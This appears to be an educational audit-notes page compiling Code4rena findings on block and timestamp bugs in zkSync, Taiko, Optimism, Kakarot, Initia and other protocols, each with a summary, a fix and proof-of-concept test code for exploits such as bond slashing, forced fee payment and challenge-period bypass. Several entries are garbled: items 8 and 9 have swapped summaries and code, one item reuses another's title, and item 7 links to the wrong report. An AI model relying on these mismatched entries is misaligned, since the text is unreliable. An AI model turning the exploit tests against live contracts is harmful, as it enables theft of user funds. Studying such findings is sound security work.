# ETAAcademy-Adudit: 2. Block

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>02. Block</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>EVM</th>
          <td>block</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Evta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[Medium] Timestamp Constraints Leading to Number of Blocks Creation Limitations

### Different timestamp constraints between batches and blocks

- Summary : The constraints on timestamp differences between batches and their respective blocks in zkSync lead to smaller batch sizes, and prohibits the simultaneous commitment of two batches on L1 within the same Ethereum block, causing bottlenecks during high transaction volumes and block space utilization.
- Impact & Recommendation: The current timestamp verification process on L1 and L2 exacerbates these issues, necessitating stricter constraints to prevent batches with future timestamps. Mitigation steps should involve applying stricter timestamp constraints on both L1 and L2.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-10-zksync#m-12-timestamp-constraints-leading-to-number-of-blocks-creation-limitations) & [Report](https://code4rena.com/reports/2023-10-zksync)

  <details><summary>POC</summary>

  ```solidity

    Batch 1000:



    Batch timestamp: X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA - 1.

    Timestamp of the last block (fictive block) in this batch: X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA.

    The time this batch is committed on L1: blockTimestamp1000.

    X <= blockTimestamp1000.



    Batch 1001:



    Batch timestamp: X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA + Y.

    Timestamp of the last block (fictive block) in this batch: X + COMMIT_TIMESTAMP_APPROXIMATION_DELTA + Y + K.

    The time this batch is committed on L1: blockTimestamp1001.

  ```

  </details>

## 2. [High] Validity and contests bond ca be incorrectly burned for the correct and ultimately verified transition

### Verify transition

- Summary: Both validity and contest bonds can be erroneously slashed even if the transition is ultimately correct and verified. This occurs because the history of the final verified transition is not considered, leading to situations where participants lose their bonds unjustly. In such scenarios, ts.prover acts as the guardian and is responsible for the final proof of the block.

- Impact & Recommendation: It suggests to enable guardians to refund validity and contest bonds similar to liveness bonds, ensuring bond recovery if a prover or contester is proven correct. Additionally, rewards sent to guardians during proof verification should not be recovered to avoid locking funds in TaikoL1.

<br> 🐬: [Source](https://code4rena.com/reports/2024-03-taiko#h-02-validity-and-contests-bond-ca-be-incorrectly-burned-for-the-correct-and-ultimately-verified-transition) & [Report](https://code4rena.com/reports/2024-03-taiko)

  <details><summary>POC</summary>
 
  ```solidity
      function testProverLoss() external{
        giveEthAndTko(Alice, 1e7 ether, 1000 ether);
        giveEthAndTko(Carol, 1e7 ether, 1000 ether);
        giveEthAndTko(Bob, 1e6 ether, 100 ether);
        console2.log("Bob balance:", tko.balanceOf(Bob));
        uint256 bobBalanceBefore = tko.balanceOf(Bob);
        vm.prank(Bob, Bob);
        bytes32 parentHash = GENESIS_BLOCK_HASH;
        uint256 blockId = 1;
        
        (TaikoData.BlockMetadata memory meta,) = proposeBlock(Alice, Bob, 1_000_000, 1024);
        console2.log("Bob balance After propose:", tko.balanceOf(Bob));
        mine(1);
        bytes32 blockHash = bytes32(1e10 + blockId);
        bytes32 stateRoot = bytes32(1e9 + blockId);
        (, TaikoData.SlotB memory b) = L1.getStateVariables();
        uint64 lastVerifiedBlockBefore = b.lastVerifiedBlockId;
        // Bob proves transition T1 for parent P1
        proveBlock(Bob, Bob, meta, parentHash, blockHash, stateRoot, meta.minTier, "");
        console2.log("Bob balance After proof:", tko.balanceOf(Bob));
        uint16 minTier = meta.minTier;
        // Higher Tier contests by proving transition T2 for same parent P1
        proveHigherTierProof(meta, parentHash, bytes32(uint256(1)), bytes32(uint256(1)), minTier);
        // Guardian steps in to prove T1 is correct transition for parent P1
        proveBlock(
            David, David, meta, parentHash, blockHash, stateRoot, LibTiers.TIER_GUARDIAN, ""
        );
        vm.roll(block.number + 15 * 12);
        vm.warp(
            block.timestamp + tierProvider().getTier(LibTiers.TIER_GUARDIAN).cooldownWindow * 60
                + 1
        );
        vm.roll(block.number + 15 * 12);
        vm.warp(
            block.timestamp + tierProvider().getTier(LibTiers.TIER_GUARDIAN).cooldownWindow * 60
                + 1
        );
        // When the correct transition T1 is verified Bob does permantley loses his validitybond
        // even though it is the correct transition for the verified parent P1.
        verifyBlock(Carol, 1);
        parentHash = blockHash;
        (, b) = L1.getStateVariables();
        uint64 lastVerifiedBlockAfter = b.lastVerifiedBlockId;
        assertEq(lastVerifiedBlockAfter, lastVerifiedBlockBefore + 1 ); // Verification completed
        uint256 bobBalanceAfter = tko.balanceOf(Bob);
        assertLt(bobBalanceAfter, bobBalanceBefore);
        console2.log("Bob Loss:", bobBalanceBefore - bobBalanceAfter);
        console2.log("Bob Loss without couting livenessbond:", bobBalanceBefore - bobBalanceAfter - 1e18); // Liveness bond is 1 ETH in tests
    }
  ```
  </details>

## 3. [High] Taiko L1 - Proposer can maliciously cause loss of funds by forcing someone else to pay prover’s fee

### Pay prover’s fee

- Summary: The libProposing library lets a proposer set the person for assigned prover fees. Malicious actors can exploit this by setting the person to another user's address, forcing them to pay fees for block proposals made by the malicious actor. This can happen if a user's approval allowance for spending tokens exceeds the actual fee they intend to pay.

- Impact & Recommendation: To prevent malicious actors from forcing others to pay fees for block proposals, a simple fix is to ensure that the block proposer always remains the msg.sender.

<br> 🐬: [Source](https://code4rena.com/reports/2024-03-taiko#h-04-taiko-l1---proposer-can-maliciously-cause-loss-of-funds-by-forcing-someone-else-to-pay-provers-fee) & [Report](https://code4rena.com/reports/2024-03-taiko)

<details><summary>POC</summary> 
  
    ```solidity
  
            if (params.coinbase == address(0)) {
        params.coinbase = msg.sender;
    }

    // When a hook is called, all ether in this contract will be send to the hook.
    // If the ether sent to the hook is not used entirely, the hook shall send the Ether
    // back to this contract for the next hook to use.
    // Proposers shall choose use extra hooks wisely.
    IHook(params.hookCalls[i].hook).onBlockProposed{ value: address(this).balance }(
        blk, meta_, params.hookCalls[i].data
    );

    // The proposer irrevocably pays a fee to the assigned prover, either in
    // Ether or ERC20 tokens.
    if (assignment.feeToken == address(0)) {
        // Paying Ether
        _blk.assignedProver.sendEther(proverFee, MAX_GAS_PAYING_PROVER);
    } else {
        // Paying ERC20 tokens
        IERC20(assignment.feeToken).safeTransferFrom(
            _meta.coinbase, _blk.assignedProver, proverFee
        );
    }

    ```

</details>

## 3. [Medium] Taiko L1 - Proposer can maliciously cause loss of funds by forcing someone else to pay prover’s fee

### Proving tier

- Summary: The `getMinTier()` function determines the minimum proving tier required for proposing a block based on a random number `_rand`. If this number meets a specific condition, a more expensive tier is required; otherwise, a cheaper one suffices. However, since the random number can be predicted in advance, proposers may choose to wait for a cheaper tier, causing delays in transaction finalization.

- Impact & Recommendation: Consider using VRF like solutions to make `_rand` truly random.

<br> 🐬: [Source](https://code4rena.com/reports/2024-03-taiko#m-11-proposers-would-choose-to-avoid-higher-tier-by-exploiting-non-randomness-of-parameter-used-in-getmintier) & [Report](https://code4rena.com/reports/2024-03-taiko)

<details><summary>POC</summary> 
  
    ```solidity

        File: contracts/L1/tiers/MainnetTierProvider.sol
    66:               function getMinTier(uint256 _rand) public pure override returns (uint16) {
    67:                   // 0.1% require SGX + ZKVM; all others require SGX
    68: @--->             if (_rand % 1000 == 0) return LibTiers.TIER_SGX_ZKVM;
    69:                   else return LibTiers.TIER_SGX;
    70:               }

        File: contracts/L1/libs/LibProposing.sol
    199:                  // Following the Merge, the L1 mixHash incorporates the
    200:                  // prevrandao value from the beacon chain. Given the possibility
    201:                  // of multiple Taiko blocks being proposed within a single
    202:                  // Ethereum block, we choose to introduce a salt to this random
    203:                  // number as the L2 mixHash.
    204: @--->            meta_.difficulty = keccak256(abi.encodePacked(block.prevrandao, b.numBlocks, block.number));
    205:
    206:                  // Use the difficulty as a random number
    207:                  meta_.minTier = ITierProvider(_resolver.resolve("tier_provider", false)).getMinTier(
    208: @--->                uint256(meta_.difficulty)
    209:                  );


    ```

</details>

## 4. [Medium] Taiko SGX Attestation - Improper validation in certchain decoding

### Improper validation

- Summary: In Taiko's ZK proof setup, SGX provers leverage remote attestation via Automata's modular attestation layer. The process involves decoding the certificate chain, validating notBefore and notAfter tags. However, a flaw in the validation logic allows an attestor to pass any value for the notBefore tag, compromising the integrity of the attestation process. This oversight poses a significant risk to the security and trustworthiness of SGX provers within Taiko's setup, highlighting the importance of rectifying the validation issue promptly.

- Impact & Recommendation: Updating the condition to `(notBeforeTag != 0x17 && notBeforeTag != 0x18)` will prevent improper validation and mitigate unforeseen consequences.

<br> 🐬: [Source](https://code4rena.com/reports/2024-03-taiko#m-13-taiko-sgx-attestation---improper-validation-in-certchain-decoding) & [Report](https://code4rena.com/reports/2024-03-taiko)

<details><summary>POC</summary> 
  
    ```solidity
                {
            uint256 notBeforePtr = der.firstChildOf(tbsPtr);
            uint256 notAfterPtr = der.nextSiblingOf(notBeforePtr);
            bytes1 notBeforeTag = der[notBeforePtr.ixs()];
            bytes1 notAfterTag = der[notAfterPtr.ixs()];
            if (
                (notBeforeTag != 0x17 && notBeforeTag == 0x18)
                    || (notAfterTag != 0x17 && notAfterTag != 0x18)
            ) {
                return (false, cert);
            }
            cert.notBefore = X509DateUtils.toTimestamp(der.bytesAt(notBeforePtr));
            cert.notAfter = X509DateUtils.toTimestamp(der.bytesAt(notAfterPtr));
        }
                if (
                (notBeforeTag != 0x17 && notBeforeTag != 0x18)
                    || (notAfterTag != 0x17 && notAfterTag != 0x18)
            ) {
                return (false, cert);

    ```

</details>

## 5. [Medium] Improper adjustment of Lending Ledger configuration

### Improper configuration for both rewards and block time parameters

- Summary: The LendingLedger's method for adjusting time-related parameters and rewards is insecure, potentially leading to retroactive application of adjustments to markets not yet updated. While warnings exist in the code, they are deemed insufficient to prevent over- or under-estimations of rewards attributed to markets.

- Impact & Recommendation: Track and update all markets together when adjusting parameters or rewards in LendingLedger. This can be done by iterating through all markets to ensure simultaneous updates, either by tracking the total number of markets or by providing an input array of markets. Additionally, for setRewards function, restrict mutations to future epochs to prevent retroactive adjustments.

<br> 🐬: [Source](https://code4rena.com/reports/2024-03-neobase#m-04-improper-adjustment-of-lending-ledger-configuration) & [Report](https://code4rena.com/reports/2024-03-neobase)

<details><summary>POC</summary> 
  
    ```solidity
    function testInsecureRewardUpdate() public {
        setupStateBeforeClaim();
        // Based on `LendingLedger.t.sol::testClaimValidLenderOneBlock`, the reward of the `lender` should be `amountPerBlock - 1` at this time point
        vm.roll(BLOCK_EPOCH * 5 + 1);
        // We update the rewards of the epochs without updating the markets
        vm.prank(governance);
        uint256 newRewardPerBlock = amountPerBlock * 2;
        ledger.setRewards(fromEpoch, toEpoch, newRewardPerBlock);
        // We claim the `lender` rewards, should be `amountPerBlock` based on `LendingLedger.t.sol::testClaimValidLenderOneBlock`
        uint256 balanceBefore = address(lender).balance;
        vm.prank(lender);
        vm.roll(BLOCK_EPOCH * 5 + 1);
        ledger.claim(lendingMarket);
        uint256 balanceAfter = address(lender).balance;
        // Assertion will fail
        assertEq(balanceAfter - balanceBefore, amountPerBlock - 1);
    }
    ```
</details>

## 6. [Medium] Ineffective swap deadline for swapRCH()

### Deadline

- Summary: The `swapRCH()` function in the `FeeCollector` contract sets the swap deadline to `block.timestamp + 10 minutes`, making it ineffective because `block.timestamp` is only determined during transaction execution.

- Impact & Recommendation: Pass the swap deadline as a parameter to the `swapRCH()` function for an absolute deadline.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-sofa-pro-league#m-03-ineffective-swap-deadline-for-swaprch) & [Report](https://code4rena.com/reports/2024-05-sofa-pro-league)

  <details><summary>POC</summary>

  ```solidity
      function swapRCH(
        address token,
        uint256 minPrice,
        address[] calldata path
    ) external onlyOwner {
        // last element of path should be rch
        require(path.length <= 4, "Collector: path too long");
        require(path[path.length - 1] == rch, "Collector: invalid path");
        uint256 amountIn = IERC20(token).balanceOf(address(this));
        IUniswapV2Router(routerV2).swapExactTokensForTokens(
            amountIn,
            amountIn * minPrice / 1e18,
            path,
            address(this),
            block.timestamp + 10 minutes
        );
    }

  ```

  </details>

## 7. [Medium] Inconsistent sequencer unexpected delay in DelayBuffer may harm users calling forceInclusion()

### DelayBuffer of sequencer outage

- Summary: When the sequencer is down, users can call `SequencerInbox::forceInclusion()` to add messages, but the delay buffer reduction is inconsistent. If multiple messages are included at once, the buffer may not decrease, causing longer wait times. However, if messages are included sequentially, the buffer decreases correctly. The provided proof of concept demonstrates this issue.

- Impact & Recommendation: To avoid double counting in the delay buffer when the sequencer is offline, track total unexpected delay separately. Calculate it as block.number minus the maximum of the previous sequenced block number and the oldest delayed message not yet included.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-sofa-pro-league#m-03-ineffective-swap-deadline-for-swaprch) & [Report](https://code4rena.com/reports/2024-05-sofa-pro-league)

  <details><summary>POC</summary>

  ```solidity
    function test_POC_InconsistentBuffer_Decrease() public {
        bool fix = false;
        maxTimeVariation.delayBlocks = 2000;
        BufferConfig memory configBufferable = BufferConfig({
            threshold: 600, //60 * 60 * 2 / 12
            max: 14400, //24 * 60 * 60 / 12 * 2
            replenishRateInBasis: 714
        });
        (SequencerInbox seqInbox, Bridge bridge) = deployRollup(false, true, configBufferable);
        address delayedInboxSender = address(140);
        uint8 delayedInboxKind = 3;
        bytes32 messageDataHash = RAND.Bytes32();
        for (uint i = 0; i < 7; i++) {
            vm.startPrank(dummyInbox);
            bridge.enqueueDelayedMessage(delayedInboxKind, delayedInboxSender, messageDataHash);
            vm.roll(block.number + 1100);
            bridge.enqueueDelayedMessage(delayedInboxKind, delayedInboxSender, messageDataHash);
            vm.stopPrank();
            vm.roll(block.number + 2001);
            uint256 delayedMessagesRead = bridge.delayedMessageCount();
            if (fix) {
                seqInbox.forceInclusion(
                        delayedMessagesRead - 1,
                        delayedInboxKind,
                        [uint64(block.number - 3101), uint64(block.timestamp)],
                        0,
                        delayedInboxSender,
                        messageDataHash
                );
            }
            seqInbox.forceInclusion(
                    delayedMessagesRead,
                    delayedInboxKind,
                    [uint64(block.number - 2001), uint64(block.timestamp)],
                    0,
                    delayedInboxSender,
                    messageDataHash
            );
        }
        (uint256 bufferBlocks, ,,,,) = seqInbox.buffer();
        assertEq(bufferBlocks, fix ? 600 : 7320);
        vm.startPrank(dummyInbox);
        bridge.enqueueDelayedMessage(delayedInboxKind, delayedInboxSender, messageDataHash);
        vm.stopPrank();
        vm.roll(block.number + 601);
        uint256 delayedMessagesRead = bridge.delayedMessageCount();
        if (!fix) vm.expectRevert(ForceIncludeBlockTooSoon.selector);
        seqInbox.forceInclusion(
                delayedMessagesRead,
                delayedInboxKind,
                [uint64(block.number - 601), uint64(block.timestamp)],
                0,
                delayedInboxSender,
                messageDataHash
        );
    }

  ```

  </details>

## 8. [Medium] Reorgs may cause licenses to be sold at 0 price

### Polygon reorgs

- Summary: Invalid handling of the `DISPUTED_L2_BLOCK_NUMBER` can lead to a denial-of-service (DoS) scenario. Specifically, the `DISPUTED_L2_BLOCK_NUMBER` passed to the VM is calculated as `starting block + trace index + 1`, potentially allowing an attacker to submit a redemption request that prevents further valid requests from being processed. This occurs because the VM's operations are not constrained to the claimed block and could incorrectly validate or invalidate claims.

- Impact & Recommendation: Cap the `DISPUTED_L2_BLOCK_NUMBER` at the claimed L2 block number to ensure the VM does not process blocks beyond this limit.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-06-playfi-proleague#m-01-Reorgs-may-cause-licenses-to-be-sold-at-0-price) & [Report](https://code4rena.com/reports/2024-06-playfi-proleague)

  <details><summary>POC</summary>

  ```solidity

      function claimLicenseEarlyAccess(uint256 amount, bytes calldata data, bytes32[] calldata merkleProof) public payable {
        if(!earlyAccessSaleActive) revert EarlyAccessSaleNotActive();
        (uint256 index, uint256 claimCap) = abi.decode(data,(uint256,uint256));
        uint256 claimedLicenses = earlyAccessClaimsPerAddress[msg.sender];
        if(amount + claimedLicenses > claimCap) revert IndividualClaimCapExceeded();
        bytes32 node = keccak256(abi.encodePacked(index, msg.sender, claimCap));
        if (!MerkleProof.verify(merkleProof, earlyAccessMerkleRoot, node)) revert InvalidProof();
        uint256 toPay = tiers[1].price * amount;

  ```

  </details>

## 9. [High] Invalid DISPUTED_L2_BLOCK_NUMBER is passed to VM

### Cap DISPUTED_L2_BLOCK_NUMBER

- Summary: The `PlayFiLicenseSale` contract had a vulnerability where reorgs on the Polygon network could result in licenses being sold at a price of 0. This issue occurred because the price of the licenses (`tiers[1].price`) could be set in a later block than the user's claim transaction, which relies on different variables.

- Impact & Recommendation: Ensure a sufficient time interval between the price setting transaction and the status update transaction, or to add a check to revert if `tiers[1].price` is zero.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-07-optimism#h-01-Reorgs-may-cause-licenses-to-be-sold-at-0-price) & [Report](https://code4rena.com/reports/2024-07-optimism)

<details><summary>POC</summary>

```solidity
        /// @inheritdoc IFaultDisputeGame
        function addLocalData(uint256 _ident, uint256 _execLeafIdx, uint256 _partOffset) external {
            // INVARIANT: Local data can only be added if the game is currently in progress.
            if (status != GameStatus.IN_PROGRESS) revert GameNotInProgress();
            (Claim starting, Position startingPos, Claim disputed, Position disputedPos) =
                _findStartingAndDisputedOutputs(_execLeafIdx);
            Hash uuid = _computeLocalContext(starting, startingPos, disputed, disputedPos);
            IPreimageOracle oracle = VM.oracle();
            if (_ident == LocalPreimageKey.L1_HEAD_HASH) {
                // Load the L1 head hash
                oracle.loadLocalData(_ident, uuid.raw(), l1Head().raw(), 32, _partOffset);
            } else if (_ident == LocalPreimageKey.STARTING_OUTPUT_ROOT) {
                // Load the starting proposal's output root.
                oracle.loadLocalData(_ident, uuid.raw(), starting.raw(), 32, _partOffset);
            } else if (_ident == LocalPreimageKey.DISPUTED_OUTPUT_ROOT) {
                // Load the disputed proposal's output root
                oracle.loadLocalData(_ident, uuid.raw(), disputed.raw(), 32, _partOffset);
            } else if (_ident == LocalPreimageKey.DISPUTED_L2_BLOCK_NUMBER) {
                // Load the disputed proposal's L2 block number as a big-endian uint64 in the
                // high order 8 bytes of the word.

                // block number.
                uint256 l2Number = startingOutputRoot.l2BlockNumber + disputedPos.traceIndex(SPLIT_DEPTH) + 1;
                oracle.loadLocalData(_ident, uuid.raw(), bytes32(l2Number << 0xC0), 8, _partOffset);
            } else if (_ident == LocalPreimageKey.CHAIN_ID) {
                // Load the chain ID as a big-endian uint64 in the high order 8 bytes of the word.
                oracle.loadLocalData(_ident, uuid.raw(), bytes32(L2_CHAIN_ID << 0xC0), 8, _partOffset);
            } else {
                revert InvalidLocalIdent();
            }
        }

```

</details>

## 10. [High] An attacker can bypass the challenge period during LPP finalization

### Initialize timestamp

- Summary: `squeezeLPP` function allows attackers to bypass the challenge period for Large Preimage Proposals (LPPs). The challenge period, which is intended to enable verification of LPP correctness, can be circumvented because the `timestamp` field in LPP metadata is not initialized during the proposal setup phase. Consequently, an attacker can finalize an LPP immediately after making several calls with `_finalize` set to `false`, as the timestamp remains uninitialized and does not trigger the challenge period check. This flaw enables malicious actors to finalize invalid LPPs without the opportunity for challenges, disrupting the integrity of the LPP process.

- Impact & Recommendation: `squeezeLPP` function should be updated to check if the proposal was finalized and if the challenge period is still active.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-07-optimism#h-05-An-attacker-can-bypass-the-challenge-period-during-LPP-finalization) & [Report](https://code4rena.com/reports/2024-07-optimism)

<details><summary>POC</summary>

```solidity

contract PreimageOracle_LargePreimageProposals_Test is Test {
    ...
    function test_squeeze_challengePeriodActive_not_revert() public {
        //! Set an appropriate value for block.timestamp.
        vm.warp(1721643596);
        // Allocate the preimage data.
        bytes memory data = new bytes(136);
        for (uint256 i; i < data.length; i++) {
            data[i] = 0xFF;
        }
        bytes memory phonyData = new bytes(136);
        // Initialize the proposal.
        oracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, 0, uint32(data.length));
        // Add the leaves to the tree with mismatching state commitments.
        LibKeccak.StateMatrix memory stateMatrix;
        bytes32[] memory stateCommitments = _generateStateCommitments(stateMatrix, data);
        //! The attacker doesn't set _finalize to true but pads the data correctly.
        oracle.addLeavesLPP(TEST_UUID, 0, LibKeccak.padMemory(phonyData), stateCommitments, false);
        // Construct the leaf preimage data for the blocks added.
        LibKeccak.StateMatrix memory matrix;
        PreimageOracle.Leaf[] memory leaves = _generateLeaves(matrix, phonyData);
        leaves[0].stateCommitment = stateCommitments[0];
        leaves[1].stateCommitment = stateCommitments[1];
        // Create a proof array with 16 elements.
        bytes32[] memory preProof = new bytes32[](16);
        preProof[0] = _hashLeaf(leaves[1]);
        bytes32[] memory postProof = new bytes32[](16);
        postProof[0] = _hashLeaf(leaves[0]);
        for (uint256 i = 1; i < preProof.length; i++) {
            bytes32 zeroHash = oracle.zeroHashes(i);
            preProof[i] = zeroHash;
            postProof[i] = zeroHash;
        }
        // Finalize the proposal.
        //! This call must revert since the challenge period has not passed.
        //! However, it does not revert.
        // vm.expectRevert(ActiveProposal.selector);
        uint256 balanceBefore = address(this).balance;
        oracle.squeezeLPP({
            _claimant: address(this),
            _uuid: TEST_UUID,
            _stateMatrix: _stateMatrixAtBlockIndex(data, 1),
            _preState: leaves[0],
            _preStateProof: preProof,
            _postState: leaves[1],
            _postStateProof: postProof
        });
        assertEq(address(this).balance, balanceBefore + oracle.MIN_BOND_SIZE());
        assertEq(oracle.proposalBonds(address(this), TEST_UUID), 0);
        bytes32 finalDigest = _setStatusByte(keccak256(data), 2);
        //! The commented value is the correct value for the preimage part.
        // bytes32 expectedPart = bytes32((~uint256(0) & ~(uint256(type(uint64).max) << 192)) | (data.length << 192));
        //! This value is not correct for the preimage part.
        bytes32 phonyPart = 0x0000000000000088000000000000000000000000000000000000000000000000;
        //! An invalid LPP is finalized and can be used in the MIPS.sol
        assertTrue(oracle.preimagePartOk(finalDigest, 0));
        assertEq(oracle.preimageLengths(finalDigest), phonyData.length);
        assertEq(oracle.preimageParts(finalDigest, 0), phonyPart);
    }
    ...
}

```

</details>

## 11. [High] RIPEMD-160 precompile yields wrong hashes for large set of inputs due to off-by-one error

### RIPEMD-160 precompile

- Summary: The RIPEMD-160 precompile contains an off-by-one error that produces incorrect hash values for specific input lengths (55 + k\*64). This issue impacts all blockchain applications relying on the precompile for hash-based logic, such as access control and verification.

- Impact & Recommendation: For input lengths 55 + k\*64 (e.g., 55, 119, 183, etc.), the Cairo implementation generates hash values that deviate from the correct RIPEMD-160 outputs. The fix aligns the boundary condition with the standard implementation, ensuring consistent and correct behavior.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-09-kakarot#h-05-ripemd-160-precompile-yields-wrong-hashes-for-large-set-of-inputs-due-to-off-by-one-error) & [Report](https://code4rena.com/reports/2024-09-kakarot)

<details><summary>POC</summary>

```cairo

    async def test_ripemd160_on_55_length_input(self, cairo_run):
        msg_bytes = bytes("abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmomnopnopq", "ascii")
        precompile_hash = cairo_run("test__ripemd160", msg=list(msg_bytes))

        # Hash with RIPEMD-160 to compare with precompile result
        ripemd160_crypto = RIPEMD160.new()
        ripemd160_crypto.update(msg_bytes)
        expected_hash = ripemd160_crypto.hexdigest()

        assert expected_hash.rjust(64, "0") == bytes(precompile_hash).hex()
```

</details>

## 12. [High] A regular Cosmos SDK message can be disguised as an EVM transaction, causing ListenFinalizeBlock to error which prevents the block from being indexed

### Block indexing failures

- Summary: In Initia’s `minievm` module, a vulnerability was found where a regular Cosmos SDK message (e.g., `MsgMultiSend`) could be disguised as an EVM transaction by using the Ethereum signing mode (`SIGN_MODE_ETHEREUM`). This caused `ConvertCosmosTxToEthereumTx` to mistakenly treat it as a valid EVM transaction. During block finalization, `ListenFinalizeBlock` would try to extract logs assuming an EVM transaction, but fail when the type URL didn't match, causing an error that stopped the entire block from being indexed. This led to missing blocks in JSON-RPC queries, skipped pruning, and missing bloom filters.

- Impact & Recommendation: The issue was fixed by adding stricter type URL checks in `ConvertCosmosTxToEthereumTx`.
  <br> 🐬: [Source](https://code4rena.com/reports/2025-02-initia-cosmos#h-02-a-regular-cosmos-sdk-message-can-be-disguised-as-an-evm-transaction-causing-listenfinalizeblock-to-error-which-prevents-the-block-from-being-indexed) & [Report](https://code4rena.com/reports/2025-02-initia-cosmos)

<details><summary>POC</summary>

```go

diff --git a/app/ante/verify.go b/app/ante/verify.go
index 6381af1..bd054a9 100644
--- a/app/ante/verify.go
+++ b/app/ante/verify.go
@@ -70,7 +70,8 @@ func verifySignature(
 			if err != nil {
 				return errorsmod.Wrapf(sdkerrors.ErrorInvalidSigner, "failed to recover sender address: %v", err)
 			}
-
+			fmt.Println("expected sender", expectedSender)
+			fmt.Println("recover sender", sender.String())
 			// check if the recovered sender matches the expected sender
 			if expectedSender == nil || *expectedSender != sender {
 				return errorsmod.Wrapf(sdkerrors.ErrorInvalidSigner, "expected sender %s, got %s", expectedSender, sender)
diff --git a/indexer/abci_test.go b/indexer/abci_test.go
index b3895ea..7051fe4 100644
--- a/indexer/abci_test.go
+++ b/indexer/abci_test.go
@@ -2,17 +2,24 @@ package indexer_test


 import (
 	"context"
+	"crypto/ecdsa"
 	"math/big"
 	"sync"
 	"testing"


+	"cosmossdk.io/collections"
+	coretypes "github.com/ethereum/go-ethereum/core/types"
+	"github.com/ethereum/go-ethereum/crypto"
+	"github.com/initia-labs/initia/crypto/ethsecp256k1"
 	"github.com/stretchr/testify/require"


-	"github.com/initia-labs/minievm/tests"
-	evmtypes "github.com/initia-labs/minievm/x/evm/types"
-
+	sdk "github.com/cosmos/cosmos-sdk/types"
 	"github.com/ethereum/go-ethereum/common"
 	"github.com/ethereum/go-ethereum/common/hexutil"
+	minitiaapp "github.com/initia-labs/minievm/app"
+	"github.com/initia-labs/minievm/tests"
+	evmkeeper "github.com/initia-labs/minievm/x/evm/keeper"
+	evmtypes "github.com/initia-labs/minievm/x/evm/types"
 )


 func Test_ListenFinalizeBlock(t *testing.T) {
@@ -62,6 +69,80 @@ func Test_ListenFinalizeBlock(t *testing.T) {

 }


+func CustomGenerateETHTx(t *testing.T, app *minitiaapp.MinitiaApp, privKey *ecdsa.PrivateKey, opts ...tests.Opt) (sdk.Tx, common.Hash) {
+	value := new(big.Int).SetUint64(0)
+
+	ctx, err := app.CreateQueryContext(0, false)
+	require.NoError(t, err)
+
+	gasLimit := new(big.Int).SetUint64(1_000_000)
+	gasPrice := new(big.Int).SetUint64(1_000_000_000)
+
+	ethChainID := evmtypes.ConvertCosmosChainIDToEthereumChainID(ctx.ChainID())
+	dynamicFeeTx := &coretypes.DynamicFeeTx{
+		ChainID:    ethChainID,
+		Nonce:      1,
+		GasTipCap:  big.NewInt(0),
+		GasFeeCap:  gasPrice,
+		Gas:        gasLimit.Uint64(),
+		To:         nil,
+		Data:       nil,
+		Value:      value,
+		AccessList: coretypes.AccessList{},
+	}
+	for _, opt := range opts {
+		opt(dynamicFeeTx)
+	}
+	if dynamicFeeTx.Nonce == 0 {
+		cosmosKey := ethsecp256k1.PrivKey{Key: crypto.FromECDSA(privKey)}
+		addrBz := cosmosKey.PubKey().Address()
+		dynamicFeeTx.Nonce, err = app.AccountKeeper.GetSequence(ctx, sdk.AccAddress(addrBz))
+		require.NoError(t, err)
+	}
+
+	ethTx := coretypes.NewTx(dynamicFeeTx)
+	signer := coretypes.LatestSignerForChainID(ethChainID)
+	signedTx, err := coretypes.SignTx(ethTx, signer, privKey)
+	require.NoError(t, err)
+
+	// Convert to cosmos tx using the custom method which uses a bank multi send message instead
+	sdkTx, err := evmkeeper.NewTxUtils(app.EVMKeeper).CustomConvertEthereumTxToCosmosTx(ctx, signedTx)
+	require.NoError(t, err)
+
+	return sdkTx, signedTx.Hash()
+}
+
+func Test_ListenFinalizeBlock_Audit_Errors(t *testing.T) {
+	app, _, privKeys := tests.CreateApp(t)
+	indexer := app.EVMIndexer()
+	defer app.Close()
+
+	// Create regular (victim) tx
+	victimTx, victimEvmTxHash := tests.GenerateCreateERC20Tx(t, app, privKeys[0])
+
+	// Create malicious tx
+	tx, evmTxHash := CustomGenerateETHTx(t, app, privKeys[0])
+
+	// Execute both tx's and verify they are successful
+	_, finalizeRes := tests.ExecuteTxs(t, app, victimTx, tx)
+	tests.CheckTxResult(t, finalizeRes.TxResults[0], true)
+	tests.CheckTxResult(t, finalizeRes.TxResults[1], true)
+
+	ctx, err := app.CreateQueryContext(0, false)
+	require.NoError(t, err)
+
+	// check the tx's are both not indexed
+	victimEvmTx, err := indexer.TxByHash(ctx, victimEvmTxHash)
+	require.ErrorIs(t, err, collections.ErrNotFound)
+	require.Nil(t, victimEvmTx)
+
+	evmTx, err := indexer.TxByHash(ctx, evmTxHash)
+	require.ErrorIs(t, err, collections.ErrNotFound)
+	require.Nil(t, evmTx)
+
+	require.False(t, true)
+}
+
 func Test_ListenFinalizeBlock_Subscribe(t *testing.T) {
 	app, _, privKeys := tests.CreateApp(t)
 	indexer := app.EVMIndexer()
diff --git a/x/bank/keeper/msg_server.go b/x/bank/keeper/msg_server.go
index 8bf9276..5938e36 100644
--- a/x/bank/keeper/msg_server.go
+++ b/x/bank/keeper/msg_server.go
@@ -4,8 +4,6 @@ import (
 	"context"


 	"github.com/hashicorp/go-metrics"
-	"google.golang.org/grpc/codes"
-	"google.golang.org/grpc/status"


 	errorsmod "cosmossdk.io/errors"
 	"github.com/cosmos/cosmos-sdk/telemetry"
@@ -85,7 +83,7 @@ func (k msgServer) Send(goCtx context.Context, msg *types.MsgSend) (*types.MsgSe
 }

 func (k msgServer) MultiSend(goCtx context.Context, msg *types.MsgMultiSend) (*types.MsgMultiSendResponse, error) {
